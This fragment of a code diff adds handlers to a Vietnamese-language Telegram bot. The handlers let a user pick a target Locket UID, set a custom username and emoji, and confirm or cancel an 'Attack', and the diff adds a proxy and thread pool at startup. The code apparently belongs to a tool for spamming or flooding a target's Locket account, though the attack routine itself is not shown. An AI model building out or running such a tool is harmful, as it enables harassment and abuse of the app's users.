+def handle_cancel_attack_callback(call):
+    user_id = call.from_user.id
+    chat_id = call.message.chat.id
+    message_id = call.message.message_id
+
+    if user_id not in user_states or user_states[user_id]["message_id"] != message_id:
+        bot.answer_callback_query(call.id, "Phiên làm việc này đã hết hạn hoặc không hợp lệ.")
+        return
+
+    bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
+                          text="Đã hủy bỏ Attack.", parse_mode='HTML')
+    bot.answer_callback_query(call.id, "Đã hủy.")
+    if user_id in user_states:
+        del user_states[user_id]
+
+
+@bot.message_handler(func=lambda message: True, content_types=['text'])
+def handle_message(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+
+    # Nếu người dùng đã ở trong một luồng xử lý lệnh và đang chờ username custom
+    if user_id in user_states and user_states[user_id].get("command") == "locket" and user_states[user_id].get("target"):
+        # Cập nhật username_custom và chuyển sang bước xác nhận cuối cùng
+        new_username = message.text.strip()
+        if 1 <= len(new_username) <= 20:
+            user_states[user_id]["username_custom"] = new_username
+            uid = user_states[user_id]["target"]
+            use_emoji = user_states[user_id]["use_emoji"]
+            emoji_status = "BẬT" if use_emoji else "TẮT"
+
+            keyboard = InlineKeyboardMarkup()
+            keyboard.row(
+                InlineKeyboardButton("Bật Emoji", callback_data=f"emoji_on_{user_id}"),
+                InlineKeyboardButton("Tắt Emoji", callback_data=f"emoji_off_{user_id}")
+            )
+            keyboard.add(InlineKeyboardButton("Xác nhận chạy Attack", callback_data=f"confirm_attack_{user_id}"))
+
+            bot.edit_message_text(chat_id=chat_id, message_id=user_states[user_id]["message_id"],
+                                  text=f"✅ Tìm thấy Locket UID: <code>{uid}</code>\n"
+                                       f"Username tùy chỉnh: <b>{new_username}</b>\n"
+                                       f"Emoji hiện đang: <b>{emoji_status}</b>\n\n"
+                                       f"Bạn muốn tùy chỉnh gì không?",
+                                  reply_markup=keyboard, parse_mode='HTML')
+            # Xóa tin nhắn của người dùng để giữ sạch chat
+            bot.delete_message(chat_id, message.message_id)
+        else:
+            bot.send_message(chat_id, "Username quá dài hoặc quá ngắn (1-20 ký tự). Vui lòng gửi lại.", 
+                             reply_to_message_id=message.message_id)
+    else:
+        # Nếu không phải lệnh đang được xử lý, bot bỏ qua hoặc phản hồi mặc định
+        bot.reply_to(message, "Tôi không hiểu lệnh này. Vui lòng sử dụng lệnh /locket để bắt đầu.")
 
 @bot.message_handler(commands=["time"])
 @increment_interaction_count
@@ -2020,9 +2720,11 @@ def webhook():
         logging.error(f"Lỗi webhook: {e}")
         return "Error", 500
 
+
 # === Khởi chạy Bot ===
 if __name__ == "__main__":
     try:
+        bot_proxy_queue, bot_num_threads = init_proxy()
         webhook_info = bot.get_webhook_info()
         current_webhook_url = f"{APP_URL}/{TOKEN}"
         if webhook_info.url != current_webhook_url:
